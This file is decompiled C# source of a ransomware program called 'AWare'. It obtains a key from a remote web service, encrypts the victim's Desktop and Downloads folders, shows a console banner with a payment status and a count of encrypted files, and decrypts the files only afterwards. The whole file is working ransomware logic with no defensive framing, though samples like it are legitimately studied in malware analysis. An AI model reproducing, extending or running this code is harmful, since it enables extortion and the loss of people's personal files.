using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using AWare.Extensions;
using AWare.Helper;
using AWare.Models.Web;
using AWare.Services;
using AWare.Services.Web;

namespace AWare
{
	// Token: 0x02000003 RID: 3
	internal static class Program
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		// (set) Token: 0x06000002 RID: 2 RVA: 0x00002057 File Offset: 0x00000257
		private static string SecretKey { get; set; }

		// Token: 0x17000002 RID: 2
		// (get) Token: 0x06000003 RID: 3 RVA: 0x0000205F File Offset: 0x0000025F
		private static string ConsoleTitle
		{
			get
			{
				return string.Format("AWare — {0} | Files Encrypted's: {1}", ConsoleHelper.PaymentStatus.Item1, (double)Program.ProtectedFiles.Count);
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002088 File Offset: 0x00000288
		private static async Task Main()
		{
			Program._aesServices = new AesServices();
			AWareWebResponse awareWebResponse = await new AWareWebServices(new UidHelper().Id).InitializeAWareWebServicesAsync();
			AWareWebResponse aWareResponse = awareWebResponse;
			awareWebResponse = null;
			if (!aWareResponse.success)
			{
				Environment.Exit(0);
			}
			Program.SecretKey = Program._aesServices.DecryptString(aWareResponse.SecretKey, aWareResponse.EncryptionKey);
			foreach (string i in Program.ImportantPaths)
			{
				i.EncryptDirectories(Program._aesServices, Program.SecretKey);
				i = null;
			}
			string[] array = null;
			if (Console.WindowWidth != 220)
			{
				Console.WindowWidth = 220;
			}
			Thread consoleUpdateThread = new Thread(delegate
			{
				Program.<>c.<<Main>b__9_0>d <<Main>b__9_0>d = new Program.<>c.<<Main>b__9_0>d();
				<<Main>b__9_0>d.<>t__builder = AsyncVoidMethodBuilder.Create();
				<<Main>b__9_0>d.<>4__this = Program.<>c.<>9;
				<<Main>b__9_0>d.<>1__state = -1;
				<<Main>b__9_0>d.<>t__builder.Start<Program.<>c.<<Main>b__9_0>d>(ref <<Main>b__9_0>d);
			});
			consoleUpdateThread.Start();
			ConsoleHelper.AsciiHeader(aWareResponse.SessionID);
			foreach (string j in Program.ProtectedFiles)
			{
				for (;;)
				{
					try
					{
						FileInfo fileInfo = new FileInfo(j);
						if (!fileInfo.Name.ToLower().Contains("aware"))
						{
							break;
						}
						Program._aesServices.DecryptFile(j, fileInfo.FullName.Replace(".AWare", "") ?? "", Program.SecretKey, 10);
						break;
					}
					catch
					{
					}
				}
				j = null;
			}
			List<string>.Enumerator enumerator = default(List<string>.Enumerator);
			Environment.Exit(0);
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000020F0 File Offset: 0x000002F0
		[DebuggerStepThrough]
		private static void <Main>()
		{
			Program.Main().GetAwaiter().GetResult();
		}

		// Token: 0x04000003 RID: 3
		private static AesServices _aesServices;

		// Token: 0x04000004 RID: 4
		public static List<string> ProtectedFiles = new List<string>();

		// Token: 0x04000006 RID: 6
		private static readonly string[] ImportantPaths = new string[]
		{
			Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
			ConsoleHelper.GetDownloadsPath()
		};
	}
}
